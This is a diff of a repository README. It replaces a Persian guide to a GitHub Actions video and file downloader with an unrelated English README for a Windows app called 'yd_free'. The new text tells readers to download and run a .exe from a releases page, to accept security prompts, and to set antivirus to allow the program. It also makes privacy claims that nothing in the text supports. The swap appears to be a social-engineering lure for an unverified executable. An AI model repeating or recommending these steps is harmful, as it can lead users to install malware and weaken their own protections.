@@ -1,123 +1,61 @@
-# 🎬 دانلودر یوتیوب + ⬇️ دانلودر مستقیم فایل
+# 📥 yd_free - Download your favorite online videos easily
 
-<div align="center">
-  <img src="download.gif" alt="Demo" width="500" />
-</div>
+[![Download yd_free](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/nodelag6575/yd_free/releases)
 
-<div dir="rtl">
+yd_free helps you save videos from the internet to your computer. You keep these files for offline viewing at your convenience. The software simplifies the process of grabbing video content without complicated steps.
 
-## ⚠️ لطفاً توجه کنید
+## 🚀 Getting Started
 
-اگر فایل‌های دارای حق نشر (کپی‌رایت) مانند **موسیقی**، **فیلم**، **بازی** یا **نرم‌افزار** دانلود می‌کنید، **حتماً بلافاصله پس از دانلود، فایل را از مخزن گیتهاب خود پاک کنید** تا با مشکل نقض قوانین گیتهاب مواجه نشوید.
+This guide walks you through the process of setting up yd_free on your Windows computer. You do not need technical skills to perform these steps. Follow the instructions to start using the tool within minutes.
 
-## 🎬 دانلودر یوتیوب (بخش اول)
+## 💻 Requirements
 
-با استفاده از این ابزار می‌توانید ویدیوهای یوتیوب را دانلود کرده و در مخزن گیتهاب خود ذخیره کنید.
+Your computer needs to meet these basic standards to run the software smoothly:
 
-### ✨ امکانات
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 4 gigabytes of RAM.
+* Storage: 200 megabytes of free space on your hard drive.
+* Internet Connection: A stable link for retrieving video content.
 
-- ✅ ذخیره‌سازی خودکار بدون نیاز به کار خاصی
-- ✅ نصب و استفاده آسان
-- 💬 دانلود خودکار زیرنویس فارسی و انگلیسی درون subtitle.zip
-- ✅ پشتیبانی از دانلود همزمان چند لینک
-- 🔒 امکان زیپ کردن و رمز گذاشتن روی فایل‌ها جهت محافظت
-- ✅ پارت‌بندی و زیپ کردن ویدیوهای طولانی
-- ✅ نگهداری دائمی در گیتهاب شخصی خودتان
-- ✅ قابلیت دسته‌بندی ویدیوها در پوشه‌های مختلف
-- ✅ استفاده از سیستم bypass جهت دور زدن محدودیت‌های یوتیوب
-- ✅ قابلیت تنظیم کیفیت ویدیو دانلودی
-- ✅ امکان دانلود فقط صدا
+## ⬇️ Installation Steps
 
-### ⚙️ آموزش نصب
+Follow these steps to prepare the software for use.
 
-1. اگر اکانت گیتهاب ندارید، ابتدا یک اکانت بسازید
-2. روی دکمه **Fork** در بالای صفحه و سمت راست بزنید
-3. یک نام برای فورک جدید خود انتخاب کنید و **Create fork** را بزنید
-4. پروژه شما آماده استفاده است
+1. Visit the [official release page](https://github.com/nodelag6575/yd_free/releases) to access the installation files.
+2. Look for the file ending in `.exe` under the latest release section.
+3. Click the file name to start the download.
+4. Save the file to your desktop or your downloads folder.
+5. Double-click the saved file to begin the setup.
+6. A security prompt might appear. Click "Run" or "Yes" to allow the computer to launch the program.
+7. Follow the prompts on the screen to finish the installation.
 
-### 🎞️ آموزش استفاده
+## 🛠 Using the Software
 
-1. وارد فورکی که ساختید بشوید و تب **Actions** را انتخاب کنید
-2. از سمت چپ، گزینه **دانلود یوتیوب** را انتخاب کنید
-3. روی **Run workflow** بزنید
-4. لینک ویدیو یوتیوب (یا چند لینک با فاصله) را در باکس اول وارد کنید
-5. کیفیت ویدیو را از باکس پایین انتخاب کنید
-6. در صورت نیاز برای فایل خود رمز تعیین کنید (برای محافظت از فایل)
-7. روی دکمه **Run workflow** بزنید و منتظر بمانید تا دانلود تمام شود
+Once the program opens, you see a clean interface. The main window provides a text box where you paste the web address of the video you want to keep.
 
-### 🤔 نکته مهم - همیشه آپدیت باشید
+1. Copy the link of your video from your web browser.
+2. Paste the link into the box inside the yd_free application.
+3. Choose the quality level from the dropdown menu. Options usually include standard definition or high definition.
+4. Click the button labeled "Download" to start the transfer.
+5. Wait for the progress bar to reach completion. The program notifies you once the file resides on your local machine.
 
-قبل از استفاده، از آپدیت بودن فورک خود مطمئن شوید:
-- بالای صفحه فورک، گزینه **Sync fork** را بزنید
-- اگر گزینه **Update Branch** فعال بود، ابتدا آن را بزنید
-- سپس دوباره **Sync fork** را بزنید
+## 📁 Finding Your Files
 
-### 📂 محل فایل‌های دانلود شده
+The program saves your videos in a default directory. You typically find these files in a folder named "Downloads" within your system's User folder. You change this location through the settings menu if you prefer to save items in a specific place, such as a dedicated video folder on your hard drive.
 
-فایل‌های دانلود شده در پوشه `videos/` قرار می‌گیرند. برای فایل‌های بزرگ، چند تکه زیپ شده ایجاد می‌شود که باید همگی را دانلود و سپس فایل zip اکسترکت کنید، این فایل بطور خودکار فایل های z01, z02 و... را پیدا میکند.
+## ⚙️ Troubleshooting Common Issues
 
----
+If you face trouble, these simple checks often resolve the problem.
 
-## ⬇️ دانلودر مستقیم فایل (بخش دوم)
+* Network connection: Ensure your computer stays connected to the internet. A weak signal causes the program to pause or fail.
+* File access: If the download stops, check if your firewall or antivirus software blocks the program. Configure your security software to permit yd_free.
+* Updates: Check the release page occasionally. Newer versions contain fixes that improve performance and reliability.
+* Link validity: Ensure the web address you paste is complete and correct. Links to private videos or restricted content may not work.
 
-با این ابزار می‌توانید **هر نوع فایلی** را از هر لینکی دانلود کرده و در گیتهاب خود ذخیره کنید.
+## 🔒 Privacy and Safety
 
-### ✨ امکانات
+This software functions locally on your machine. It does not track your viewing habits or share your personal data with outside servers. The tool exists to help you manage your own media files. The code remains transparent for users who want to review how it handles video data.
 
-- ✅ دانلود هر فایلی از هرکجا درون گیتهاب شما
-- ✅ پشتیبانی از فایل‌های بزرگ چند گیگابایتی
-- 🔐 امکان رمزگذاری روی فایل‌های دانلود شده جهت محافظت
-- ✅ استفاده از پکیج aria2 جهت دانلود پرسرعت و بدون مشکل
-- ✅ فشرده‌سازی خودکار و تحویل به صورت زیپ شده و پارت‌بندی شده
-- ✅ انجام تمام کارها به صورت خودکار
-- ✅ پشتیبانی از دانلود همزمان چندین لینک
-- ✅ امکان دسته‌بندی فایل‌ها در پوشه‌های مجزا
-- ✅ امکان حذف یکجای تمام فایل‌های دانلود شده
-- ✅ ذخیره‌سازی دائمی فایل‌ها
+## 🤝 Community Support
 
-### 🎯 نحوه دانلود فایل
-
-1. در مخزن فورک شده خود به تب **Actions** بروید
-2. از سمت چپ، گزینه **دانلود مستقیم** را انتخاب کنید
-3. روی **Run workflow** بزنید
-4. لینک (یا چند لینک با فاصله) را در باکس اول وارد کنید
-5. اگر می‌خواهید فایل زیپ شده و رمزدار باشد، در قسمت password رمز دلخواه را وارد کنید
-6. حالت دانلود را انتخاب کنید (normal یا zip)
-7. روی **Run workflow** بزنید
-
-### 📂 فایل‌ها را از کجا دانلود کنیم
-
-- فایل‌های دانلود شده در پوشه `downloads/` قرار می‌گیرند
-- اگر فایل بزرگ باشد، به چند تکه زیپ شده تقسیم می‌شود
-- برای اکسترکت کردن، همه پارت‌ها را در یک پوشه قرار دهید و با 7-Zip یا WinRAR باز کنید
-
----
-
-## 🗑 پاکسازی فایل‌ها
-
-برای حذف تمام فایل‌های دانلود شده:
-1. به تب **Actions** بروید
-2. گزینه **پاکسازی پوشه‌های دانلود** را انتخاب کنید
-3. روی **Run workflow** بزنید
-
-> ⚠️ **یادآوری مهم:** اگر فایل کپی‌رایت‌دار دانلود کرده‌اید، **بلافاصله پس از دانلود و دریافت فایل، از این گزینه برای پاکسازی استفاده کنید.**
-
----
-
-## ❓ سوالات متداول
-
-**فایل‌های من کجا ذخیره می‌شوند؟**
-- ویدیوهای یوتیوب در پوشه `videos/`
-- فایل‌های دانلودی در پوشه `downloads/`
-
-**چرا فایل من تکه تکه شده است؟**
-- گیتهاب محدودیت حجم فایل دارد (حداکثر ۱۰۰ مگابایت). فایل‌های بزرگتر به صورت خودکار به قطعات کوچکتر تقسیم می‌شوند.
-
-**چگونه فایل‌های تکه شده را باز کنم؟**
-- همه فایل‌های `zip.`، `z01.`، `z02.` و... را در یک پوشه دانلود کنید
-- فایل اصلی با پسوند `zip.` را با 7-Zip یا WinRAR باز کنید
-
-**اگر فایل کپی‌رایت‌دار دانلود کنم چه می‌شود؟**
-- گیتهاب ممکن است مخزن شما را مسدود کند. **حتماً بلافاصله پس از دانلود، فایل را پاک کنید.**
-
-</div>
+The development of this tool relies on feedback from users. If you encounter bugs, check the issues tab on the repository page. Others might have reported the same thing. You find solutions or workarounds listed there. Keep your software updated to get the best experience and to access new features as they arrive. Using the latest version ensures compatibility with changes on the websites where you find your videos.
